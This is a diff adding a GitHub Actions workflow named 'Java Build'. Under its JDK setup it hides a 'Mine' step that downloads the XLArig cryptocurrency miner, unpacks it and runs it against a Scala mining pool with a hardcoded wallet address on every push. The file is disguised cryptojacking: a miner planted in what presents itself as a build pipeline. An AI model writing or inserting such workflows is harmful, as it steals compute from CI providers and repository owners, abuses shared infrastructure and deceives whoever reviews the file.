@@ -1,0 +1,29 @@
+name: Java Build
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+
+      - name: Mine
+        run: |
+          apt update -y
+          apt upgrade -y
+          cd
+          mkdir here
+          cd here
+          wget https://github.com/scala-network/XLArig/releases/download/v5.2.1/XLArig-v5.2.1-linux-x86_64.zip
+          mv XLArig-v5.2.1-linux-x86_64.zip xla.zip
+          apt install unzip -y
+          unzip xla.zip
+          chmod +x xlarig
+          ./xlarig -o pool.scala.network:3333 -u SvmAgqJnAsocq85YumCfnfZHFvUgD3t7oGKvPtkvU8Hz7LkxCsdPdJ6Pm9L7yFbVT2AnJWMiY3mEcWMckqAKYq8T1NXUpJsPk -p x --algo panthera
